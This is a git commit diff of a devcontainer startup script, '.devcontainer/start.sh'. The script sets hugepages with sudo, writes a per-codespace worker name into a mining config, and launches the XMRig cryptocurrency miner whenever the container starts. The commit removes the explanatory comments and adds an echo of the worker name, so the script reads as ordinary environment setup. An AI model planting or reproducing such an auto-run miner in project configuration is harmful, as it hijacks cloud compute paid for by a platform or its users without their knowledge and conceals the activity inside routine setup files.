3ed158f6e833ee0825570887c251041031983cdd
Thai Minh Nguyen <109969513+thaiminh0911@users.noreply.github.com>
2026-05-02 09:11:48 +0700

    Update start.sh

--- .devcontainer/start.sh
+++ .devcontainer/start.sh
@@ -1,13 +1,7 @@
 #!/bin/bash
 
-# Try to enable hugepages (Codespaces may ignore this silently)
 sudo sysctl -w vm.nr_hugepages=4096 || true
-
-# Generate worker name
 WORKER="krxXJZV2MW.$CODESPACE_NAME"
-
-# Update config.json
 sed -i "s/\"user\": \".*\"/\"user\": \"$WORKER\"/" /workspaces/temp/config.json
-
-# Run XMRig
+echo "Worker name: $WORKER"
 /home/miner/xmrig/build/xmrig --config /workspaces/temp/config.json
